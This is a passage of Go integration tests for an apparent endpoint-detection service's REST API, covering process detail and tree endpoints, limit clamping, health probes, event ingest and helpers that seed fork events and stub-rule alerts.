	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts//tree", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	// Empty path segment yields a 404 from the mux (the path matcher doesn't accept the empty {host_id}). Either 400 or 404 is acceptable;
	// just confirm it's NOT 200.
	assert.NotEqual(t, http.StatusOK, resp.StatusCode)
}

func TestOperatorHTTP_ProcessDetail_BadPID(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts/host-a/processes/notanumber", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusBadRequest, resp.StatusCode)
}

// spec:server-rest-api/per-process-detail-with-re-exec-chain/the-pid-is-not-known-on-the-host
func TestOperatorHTTP_ProcessDetail_NotFound(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts/no-such/processes/12345", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusNotFound, resp.StatusCode)
}

// spec:server-rest-api/per-host-process-forest/an-operator-views-a-host-s-process-tree
func TestOperatorHTTP_ProcessTree_HappyPath(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	mustInsertProcess(t, t.Context(), d, "tree-host", 100)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/api/hosts/tree-host/tree?limit=50", nil)
	require.NoError(t, err)
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
	var body struct {
		Roots []api.ProcessNode `json:"roots"`
	}
	require.NoError(t, json.NewDecoder(resp.Body).Decode(&body))
	assert.NotEmpty(t, body.Roots)
}

// TestOperatorHTTP_ProcessTree_LimitClamping pins the three branches in the handler's limit handling so a regression in the parse
// helper or the processTreeDefaultLimit / processTreeMaxLimit constants does not silently slip through. Each subtest only asserts a
// 200 status: the clamp happens before the underlying query runs, so the observable contract is "every limit value (absent, zero,
// negative, oversized) yields a successful response".
func TestOperatorHTTP_ProcessTree_LimitClamping(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterAuthedRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	mustInsertProcess(t, t.Context(), d, "tree-host", 100)

	cases := []struct {
		name string
		path string
	}{
		{"absent limit -> default", "/api/hosts/tree-host/tree"},
		{"limit=0 -> default", "/api/hosts/tree-host/tree?limit=0"},
		{"negative limit -> default", "/api/hosts/tree-host/tree?limit=-1"},
		{"oversized limit -> max", "/api/hosts/tree-host/tree?limit=6000"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+tc.path, nil)
			require.NoError(t, err)
			resp, err := srv.Client().Do(req)
			require.NoError(t, err)
			defer resp.Body.Close()
			assert.Equal(t, http.StatusOK, resp.StatusCode)
		})
	}
}

// ---- Health probes ---------------------------------------------------------

func TestHealthRoutes_LivezReadyz(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterHealthRoutes(mux)
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	for _, path := range []string{"/livez", "/readyz", "/health"} {
		req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+path, nil)
		require.NoError(t, err)
		resp, err := srv.Client().Do(req)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, resp.StatusCode, "path=%s", path)
		resp.Body.Close()
	}
}

// ---- Ingest routes wiring --------------------------------------------------

func TestRegisterIngestRoutes_MountsPostEvents(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	mux := http.NewServeMux()
	d.RegisterIngestRoutes(mux)
	srv := httptest.NewServer(withHostID(mux, "host-a"))
	t.Cleanup(srv.Close)

	body := `[{"event_id":"e","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{}}]`
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, srv.URL+"/api/events",
		strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
}

// ---- API wire helpers ------------------------------------------------------

// (Wire decode + Marshal/Unmarshal for NullRawJSON are tested in the detection/api package's own _test.go file alongside these
// integration tests.)

// ---- Cross-context heartbeat (response -> detection) ----------------------

func TestRecordHostSeen_SatisfiesResponseHeartbeatShape(t *testing.T) {
	t.Parallel()
	// The response context wires its Heartbeat closure to detectionCtx.Service().RecordHostSeen. This test pins the signature
	// compatibility so a future signature drift breaks the build via the type alias check below rather than at runtime.
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})

	// Wrapping in a function literal with the exact heartbeat signature pins the shape: if RecordHostSeen drifts away from what the
	// response context's Heartbeat closure expects, this fails to compile rather than at runtime.
	responseHeartbeat := func(ctx context.Context, hostID string, at time.Time) error {
		return d.Service().RecordHostSeen(ctx, hostID, at)
	}
	require.NotNil(t, responseHeartbeat)

	calls := atomic.Int64{}
	wrapped := func(ctx context.Context, hostID string, at time.Time) error {
		calls.Add(1)
		return responseHeartbeat(ctx, hostID, at)
	}
	require.NoError(t, wrapped(t.Context(), "host-x", time.Now()))
	assert.Equal(t, int64(1), calls.Load())
}

// ---- Helpers ---------------------------------------------------------------

// insertEventsViaIngest sends the batch through the agent-facing IngestHandler so the test exercises the same path production uses
// (validation + host_id pin enforcement + UpsertHosts side effect).
func insertEventsViaIngest(ctx context.Context, t *testing.T, d *bootstrap.Detection, hostID string, events []api.Event) {
	t.Helper()
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), hostID))
	t.Cleanup(srv.Close)
	body, err := json.Marshal(events)
	require.NoError(t, err)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(string(body)))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
}

// mustInsertProcess seeds a process row (so subsequent alerts can reference its id via fk_alerts_process). Uses the public Service
// surface so the helper doesn't reach into detection/internal/mysql from outside detection/. The EventID embeds the pid so a test
// that needs processes with DISTINCT pids on the same host can call this helper repeatedly: (host-a, pid=100) and
// (host-a, pid=200) produce different event_ids and both fork events land. Calling the helper twice with the SAME (host, pid)
// tuple is idempotent by design: the second event_id collides with the first and INSERT IGNORE drops the duplicate; the
// helper still returns the procID materialised by the first call.
func mustInsertProcess(t *testing.T, ctx context.Context, d *bootstrap.Detection, hostID string, pid int) int64 {
	t.Helper()
	insertEventsViaIngest(ctx, t, d, hostID, []api.Event{
		{
			EventID:     "fork-seed-" + hostID + "-" + strconv.Itoa(pid),
			HostID:      hostID,
			TimestampNs: int64(pid), // distinct timestamps per process for deterministic ordering downstream
			EventType:   "fork",
			Payload:     json.RawMessage(`{"child_pid":` + strconv.Itoa(pid) + `,"parent_pid":1}`),
		},
	})
	// Wait for the processor to materialise the row.
	var procID int64
	require.Eventually(t, func() bool {
		p, err := d.Service().GetProcessDetail(ctx, hostID, pid, time.Now().UnixNano())
		if err != nil || p == nil {
			return false
		}
		procID = p.Process.ID
		return true
	}, 5*time.Second, 50*time.Millisecond, "processor must materialise the seed fork")
	return procID
}

// seedSingleAlert produces one alert via the engine path so tests
// have a stable id to update.
func seedSingleAlert(t *testing.T, ctx context.Context, d *bootstrap.Detection) int64 {
	t.Helper()
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "seed"}}})
	mustInsertProcess(t, ctx, d, "host-a", 100)
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "seed-trigger", HostID: "host-a", TimestampNs: 1, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})
	var alertID int64
	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		if len(alerts) == 0 {
			return false
		}
		alertID = alerts[0].ID
		return true
	}, 5*time.Second, 50*time.Millisecond)
	return alertID
}

// insertAlertDirect drives one alert through the engine path for the given host. ruleID picks the dedup key; the stub rule's
// ProcessID=1 happens to resolve against the seed process row this helper relies on having been inserted by mustInsertProcess up
// front.
func insertAlertDirect(t *testing.T, ctx context.Context, d *bootstrap.Detection, hostID, ruleID string, _ int64, _ []string) {
	t.Helper()
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: ruleID}}})
	insertEventsViaIngest(ctx, t, d, hostID, []api.Event{
		{EventID: hostID + "-trig", HostID: hostID, TimestampNs: 1, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})
	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: hostID})
		return len(alerts) > 0
	}, 5*time.Second, 50*time.Millisecond)
}

// countNodes recursively counts process nodes across the forest.
func countNodes(forest []api.ProcessNode) int {
	n := 0
	for _, root := range forest {
		n += 1 + countNodes(root.Children)
	}
	return n
}

// flattenPaths walks the forest and returns every node's Path. Used
// to assert tree contents without depending on a specific tree shape.
func flattenPaths(forest []api.ProcessNode) []string {
	var out []string
	for _, root := range forest {
		out = append(out, root.Path)
		out = append(out, flattenPaths(root.Children)...)
	}
	return out
}
